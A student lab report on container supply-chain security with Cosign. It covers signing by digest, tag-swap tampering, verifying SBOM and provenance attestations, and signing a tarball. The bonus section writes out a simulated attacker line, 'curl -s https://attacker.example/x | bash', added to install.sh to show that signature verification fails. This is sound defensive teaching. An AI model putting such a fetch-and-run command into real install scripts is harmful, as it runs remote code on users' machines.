# Lab 8 — Supply Chain: Signing, Tampering, and Attestation

**Environment.** I used Cosign `v3.0.2`, Docker 29.8 (with the containerd image store) and a local `registry` v3.0.0 on `127.0.0.1:5000`. The public key is `labs/lab8/keys/cosign.pub`. The private key `cosign.key` is not committed (see *Private key* at the end).

The machine I signed on could not reach the Sigstore TUF CDN (`tuf-repo-cdn.sigstore.dev` → `Forbidden`). Cosign 3.0 tries to load its signing config and trusted root from there even when nothing is uploaded to Rekor, so I added two offline-only flags to the lab's commands:

- **`--use-signing-config=false` on `sign` / `attest` / `sign-blob`.** This does not fetch the service URLs. They are unused anyway with `--tlog-upload=false`.
- **`--trusted-root <empty trusted root>` on `verify*`.** The trusted root contains no CAs or logs. The only trust anchor is still the `--key cosign.pub` I pass, so the check is the same.

Everything else is exactly as in the lab, including `--tlog-upload=false`, `--insecure-ignore-tlog` and `--allow-insecure-registry`. Docker Hub was also blocked, so `bkimminich/juice-shop:v20.0.0` was loaded from a `docker save` archive of the same image (index digest `sha256:fd58bdc9…` as in Labs 4 and 7). `alpine:3.20` was built from the official `alpinelinux/docker-alpine` rootfs (branch `v3.20`, minirootfs 3.20.10).

## Task 1

### 8.1 Which digest I signed

```
$ docker push localhost:5000/juice-shop:v20.0.0
 Info -> Not all multiplatform-content is present and only the available single-platform image was pushed
         sha256:fd58bdc9745416afce8184ee0666278a436574633ea7880365153a63bfd418b0 -> sha256:28870b9d2bec49e605d6ebbf4b22ed1ec1ca0a72347ef19217bbbb21ea44e3fe

$ docker inspect localhost:5000/juice-shop:v20.0.0 --format '{{range .RepoDigests}}{{println .}}{{end}}'
bkimminich/juice-shop@sha256:fd58bdc9745416afce8184ee0666278a436574633ea7880365153a63bfd418b0
localhost:5000/juice-shop@sha256:fd58bdc9745416afce8184ee0666278a436574633ea7880365153a63bfd418b0
```

The image has two repo digests, one for Docker Hub and one for the local registry, which is the lab's point. The `grep '^localhost:5000/'` filter from 8.1 selects the second one. With Docker's containerd image store, though, that line still shows the multi-platform **index** digest `fd58bdc9…`. Only the amd64 manifest was pushed, as the `Info` line says, so that digest does not exist in my registry, and signing it fails:

```
Error: signing [localhost:5000/juice-shop@sha256:fd58bdc9…]: signing digest: HEAD http://localhost:5000/v2/juice-shop/manifests/sha256:fd58bdc9…: unexpected status code 404 Not Found
```

So I took the digest from the registry itself (the `Docker-Content-Digest` header of `GET /v2/juice-shop/manifests/v20.0.0`). It matches the right-hand side of Docker's push message:

```
localhost:5000/juice-shop@sha256:28870b9d2bec49e605d6ebbf4b22ed1ec1ca0a72347ef19217bbbb21ea44e3fe
```

That is the **signed digest**, saved in `labs/lab8/results/juice-shop-digest.txt`.

### 8.2 Signature and successful verification

```
$ cosign sign --key labs/lab8/keys/cosign.key --tlog-upload=false --allow-insecure-registry --yes "$DIGEST"
$ cosign verify --key labs/lab8/keys/cosign.pub --insecure-ignore-tlog --allow-insecure-registry "$DIGEST"

Verification for localhost:5000/juice-shop@sha256:28870b9d2bec49e605d6ebbf4b22ed1ec1ca0a72347ef19217bbbb21ea44e3fe --
The following checks were performed on each of these signatures:
  - The cosign claims were validated
  - Existence of the claims in the transparency log was verified offline
  - The signatures were verified against the specified public key
```

```json
[
  {
    "critical": {
      "identity": { "docker-reference": "localhost:5000/juice-shop@sha256:28870b9d2bec49e605d6ebbf4b22ed1ec1ca0a72347ef19217bbbb21ea44e3fe" },
      "image":    { "docker-manifest-digest": "sha256:28870b9d2bec49e605d6ebbf4b22ed1ec1ca0a72347ef19217bbbb21ea44e3fe" },
      "type": "https://sigstore.dev/cosign/sign/v1"
    },
    "optional": null
  }
]
```

**The private key and the pre-commit hook.** `git add labs/lab8/keys/cosign.key` is refused before any hook runs, because the repository's `.gitignore` contains `*.key`:

```
The following paths are ignored by one of your .gitignore files:
labs/lab8/keys/cosign.key
hint: Use -f if you really want to add them.
```

Forcing it with `git add -f` gets past `.gitignore`, so I ran Lab 3's two hooks on the staged key:

- `detect-private-key` (pre-commit-hooks v6.0.0) **passes it** (exit 0). It looks for fixed headers such as `BEGIN PRIVATE KEY` and `BEGIN ENCRYPTED PRIVATE KEY`, and Cosign writes `-----BEGIN ENCRYPTED SIGSTORE PRIVATE KEY-----`, which matches none of them.
- `gitleaks` v8.30.1 **blocks it**: `RuleID: private-key`, `File: labs/lab8/keys/cosign.key`, `leaks found: 2`.

So the two hooks together are what work here. On its own, the private-key hook would have let a Cosign key through.

### 8.3 Swapping the image behind the tag

```
$ docker tag alpine:3.20 localhost:5000/juice-shop:v20.0.0 && docker push localhost:5000/juice-shop:v20.0.0
signed:  localhost:5000/juice-shop@sha256:28870b9d2bec49e605d6ebbf4b22ed1ec1ca0a72347ef19217bbbb21ea44e3fe
now:     localhost:5000/juice-shop@sha256:919fbd48231c8da6bbc2e7f5e5add0a04428803e098da3b2361884500d4388f2
```

Verifying the swapped image fails. Verifying by the tag fails the same way, because the tag now resolves to the Alpine digest:

```
$ cosign verify --key labs/lab8/keys/cosign.pub --insecure-ignore-tlog --allow-insecure-registry "$TAMPERED"
Error: no signatures found
error during command execution: no signatures found
```

The original digest still verifies afterwards (exit 0):

```
$ cosign verify --key labs/lab8/keys/cosign.pub --insecure-ignore-tlog --allow-insecure-registry localhost:5000/juice-shop@sha256:28870b9d…
Verification for localhost:5000/juice-shop@sha256:28870b9d2bec49e605d6ebbf4b22ed1ec1ca0a72347ef19217bbbb21ea44e3fe --
The following checks were performed on each of these signatures:
  - The cosign claims were validated
  - Existence of the claims in the transparency log was verified offline
  - The signatures were verified against the specified public key
```

### What the signature is bound to

The signature covers the **manifest digest**, `sha256:28870b9d…`, the SHA-256 hash of the exact manifest. That manifest in turn lists the hashes of the config and of every layer, so the signature pins every byte of the image. A tag like `v20.0.0` is only a movable label: anyone with push access can point it at anything. When I moved it to Alpine, Cosign looked up signatures for the *new* digest, found none, and refused. The original digest stayed signed and verifiable, because nothing about it changed. If signatures were bound to tags instead, my signature would still "belong" to `v20.0.0` after the swap, and `cosign verify` would happily approve Alpine, or a backdoored Juice Shop. Anyone who can push a tag could reuse a valid signature for content the signer never saw. That is why deployments should pull and verify by digest, never by tag.

## Task 2

### SBOM attestation: component counts

The predicate is the Lab 4 CycloneDX SBOM (`labs/lab4/juice-shop.cdx.json` from my `feature/lab4` branch). I attached it to the signed digest and verified it:

```
$ cosign attest --key labs/lab8/keys/cosign.key --type cyclonedx --predicate labs/lab4/juice-shop.cdx.json \
    --tlog-upload=false --allow-insecure-registry --yes "$DIGEST"
Using payload from: labs/lab4/juice-shop.cdx.json

$ cosign verify-attestation --key labs/lab8/keys/cosign.pub --insecure-ignore-tlog --allow-insecure-registry --type cyclonedx "$DIGEST" \
    | jq -r '.payload | @base64d | fromjson | .predicate' > labs/lab8/results/sbom-from-attestation.json
  - The cosign claims were validated
  - The signatures were verified against the specified public key

$ jq '.components | length' labs/lab4/juice-shop.cdx.json
3069
$ jq '.components | length' labs/lab8/results/sbom-from-attestation.json
3069
```

The counts match (3069 = 3069, the same number reported in Lab 4). Beyond the count, the two files are identical after `jq -S` normalisation.

### `predicateType` of both attestations, read from the verified payload

```
$ cosign verify-attestation ... --type cyclonedx "$DIGEST"      | jq -r '.payload | @base64d | fromjson | .predicateType'
https://cyclonedx.org/bom
$ cosign verify-attestation ... --type slsaprovenance "$DIGEST" | jq -r '.payload | @base64d | fromjson | .predicateType'
https://slsa.dev/provenance/v0.2
```

Asking for a type that is not attached lists everything the digest carries:

```
Error: none of the attestations matched the predicate type: spdxjson, found: https://slsa.dev/provenance/v0.2,https://cyclonedx.org/bom,https://sigstore.dev/cosign/sign/v1
```

The registry stores these three as artifacts attached to the image digest: one signature and two attestations. `verify-attestation` against the swapped Alpine digest returns `Error: no matching attestations`.

### The decoded statement, and who wrote each field

The provenance statement after verification and base64 decoding (`payloadType: application/vnd.in-toto+json`):

```json
{
  "_type": "https://in-toto.io/Statement/v0.1",
  "predicateType": "https://slsa.dev/provenance/v0.2",
  "subject": [
    { "name": "localhost:5000/juice-shop",
      "digest": { "sha256": "28870b9d2bec49e605d6ebbf4b22ed1ec1ca0a72347ef19217bbbb21ea44e3fe" } }
  ],
  "predicate": {
    "builder":   { "id": "https://localhost/lab8-student" },
    "buildType": "https://example.com/lab8/local-build",
    "invocation": { "configSource": { "uri": "https://github.com/Mao72822/DevSecOps-Intro" } }
  }
}
```

The CycloneDX statement has the same `_type` and `subject`, with `predicateType: https://cyclonedx.org/bom`.

| Field | Value | Where it came from |
| --- | --- | --- |
| `_type` | `https://in-toto.io/Statement/v0.1` | **Cosign**: it wraps every predicate in an in-toto Statement. I never wrote it. |
| `subject[].name` | `localhost:5000/juice-shop` | **Cosign**, from the image reference I passed on the command line |
| `subject[].digest.sha256` | `28870b9d…` | **Cosign**, from resolving that reference in the registry. This is what binds the claim to the exact image. |
| `predicateType` | `https://cyclonedx.org/bom` / `https://slsa.dev/provenance/v0.2` | **Cosign**, mapped from the `--type` flag I chose (`cyclonedx`, `slsaprovenance`) |
| `predicate` | the SBOM / the provenance body | **Me**: the file passed with `--predicate`, copied unchanged |

The DSSE signature around the statement comes from my `cosign.key`.

### The morning after the next Log4Shell

A signature only answers "is this the image we built?". It says nothing about what is inside. With a signed SBOM attached to every digest, I can search two thousand images for the vulnerable package and version, e.g. `jq '.components[] | select(.name=="log4j-core")'` over each verified predicate. I get an exact list of affected digests in minutes, without pulling or re-scanning two thousand images. Because the attestation is signed and bound to the digest, I can trust that the SBOM describes that image and was not edited later. For this to work at three in the morning, several things must already be true:

- **Every image was attested at build time**, by CI and not by hand. Images with no attestation are invisible to the search.
- **The SBOM was complete.** The generator must have actually seen shaded or vendored JARs and statically linked libraries.
- **The public key is available** and trusted, and the signing key was not compromised.
- **I know which digests are actually running.** An inventory of what is deployed is what turns "affected images" into "affected services".
- **Querying is scripted in advance**, not improvised during the incident.

## Bonus

### Signing the tarball, then tampering with it

```
$ cosign sign-blob --key labs/lab8/keys/cosign.key --yes --tlog-upload=false \
    --bundle labs/lab8/results/my-tool.tar.gz.bundle labs/lab8/results/my-tool.tar.gz
Using payload from: labs/lab8/results/my-tool.tar.gz
Wrote bundle to file labs/lab8/results/my-tool.tar.gz.bundle

$ cosign verify-blob --key labs/lab8/keys/cosign.pub --bundle labs/lab8/results/my-tool.tar.gz.bundle \
    --insecure-ignore-tlog labs/lab8/results/my-tool.tar.gz
Verified OK
```

Then, as the attacker, I added `curl -s https://attacker.example/x | bash` to `install.sh` and rebuilt the tarball without re-signing. Its SHA-256 changed from `3a66250e…` to `de77a9ba…`. Verifying again with the same bundle:

```
Error: failed to verify signature: could not verify message: invalid signature when validating ASN.1 encoded signature
error during command execution: failed to verify signature: could not verify message: invalid signature when validating ASN.1 encoded signature
```

`cosign verify-blob` exits with status 1.

### What a consumer needs, and how each piece may travel

1. **The bundle**, `my-tool.tar.gz.bundle`. It holds the signature and the message digest. It **may travel with the artifact**, over the same CDN or release page: an attacker who swaps the tarball cannot produce a matching bundle without the private key. A forged bundle fails against the real public key.
2. **The public key**, `cosign.pub`. It **must not** come over the same channel. If an attacker controls the channel, they replace the tarball, the bundle *and* the key with their own, and verification says `Verified OK`. The bundle here does not even contain the key, only a `publicKey.hint`, so trust rests entirely on how the user obtained `cosign.pub`. That is the key-distribution problem: the key has to reach the user through a separate, independently trusted path. Examples are the repository itself (committed, reviewed and pinned by commit), a package manager or distro keyring, or keyless signing, where the trust root is Sigstore's TUF root plus the expected signer identity.

### Install instructions that cannot be served a modified script

> **Installing my-tool**
>
> 1. Get the public key once, from a source independent of the download server. Pin it by commit:
>    `curl -fsSLO https://raw.githubusercontent.com/<org>/my-tool/<pinned-commit-sha>/cosign.pub`
>    Check that its fingerprint matches the one in the README and on the release announcement: `sha256sum cosign.pub` → `<published fingerprint>`.
> 2. Download the artifact and its bundle to **files**, not to a pipe:
>    `curl -fsSLO https://downloads.example.com/my-tool/v1.2.3/my-tool.tar.gz`
>    `curl -fsSLO https://downloads.example.com/my-tool/v1.2.3/my-tool.tar.gz.bundle`
> 3. Verify, and stop on failure:
>    `cosign verify-blob --key cosign.pub --bundle my-tool.tar.gz.bundle my-tool.tar.gz || exit 1`
> 4. Only then unpack and run: `tar -xzf my-tool.tar.gz && bash install.sh`
>
> Never run `curl … | bash`.

Codecov's uploader was signed by nobody and verified by nobody, so every pipeline that ran `curl | bash` executed whatever the CDN served. The steps above make the script a file that is checked before it runs. The step most projects skip is **step 1, getting the key over a separate channel**. Many publish a checksum or signature next to the download, but on the same server or page. Then an attacker who can change the script can change the checksum too. The Codecov breach itself was eventually found because one customer compared the downloaded uploader against the checksum Codecov published separately on GitHub, after about two months. A second channel works, but only if someone actually runs the check. That is why step 3 has to be part of the instructions and fail closed, not be an optional extra next to the `curl | bash` one-liner.

## Private key

`labs/lab8/keys/cosign.key` stays only on my machine. `*.key` is in `.gitignore` and gitleaks blocks it, as shown above. Only `cosign.pub` is committed.
